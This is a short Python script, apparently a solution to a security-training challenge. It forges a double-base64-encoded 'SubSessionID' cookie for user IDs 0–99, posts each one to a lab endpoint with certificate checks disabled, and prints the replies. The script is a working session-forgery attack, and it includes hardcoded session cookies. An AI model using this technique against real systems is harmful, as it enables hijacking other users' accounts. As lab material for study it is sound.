import base64

import requests

header = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'X-Requested-With': 'XMLHttpRequest'
}

cookies = {
    'JSESSIONID': 'D570856A65B0E6AC6274348AD041230F',
    'token': '-67144095444784413795770327667072618483',
    'JSESSIONID3': 'FGDITjs+dL2y71uOrRHd2Q==',
}


for i in range(100):
    user_id = str(i).zfill(16)
    data = {
        'useSecurity': 'true',
        'userId': user_id
    }

    user_id_base = base64.urlsafe_b64encode(base64.urlsafe_b64encode(user_id.encode()))

    cookies['SubSessionID'] = user_id_base.decode()

    response = requests.post('https://172.50.1.5:9443/challenges/ec43ae137b8bf7abb9c85a87cf95c23f7fadcf08a092e05620c9968bd60fcba6', data=data,
                                headers=header, cookies=cookies, verify=False)
    print(response.text)
    print(user_id)
